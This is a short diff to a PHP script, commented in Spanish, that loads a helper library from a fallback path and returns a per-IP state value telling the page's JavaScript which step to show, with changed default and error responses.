@@ -1,15 +1,22 @@
 <?php
-require_once('../panel/lib/funciones.php');
+// Intentamos cargar las funciones desde la raíz
+if(file_exists('../lib/funciones.php')){
+    require_once('../lib/funciones.php');
+} elseif(file_exists('../panel/lib/funciones.php')){
+    require_once('../panel/lib/funciones.php');
+}
+
 $ip = $_SERVER['REMOTE_ADDR'];
 
 if (function_exists('traer_regitro')) {
     $registro = traer_regitro($ip);
     if ($registro) {
-        echo trim($registro['estado']); // Esto le dirá al JS si ir a 2, 4 o 6
+        // Limpiamos cualquier espacio para que el JS lo entienda
+        echo trim($registro['estado']); 
     } else {
-        echo "0";
+        echo "1"; // Estado inicial si no hay registro
     }
 } else {
-    echo "0";
+    echo "error_funciones"; 
 }
 ?>
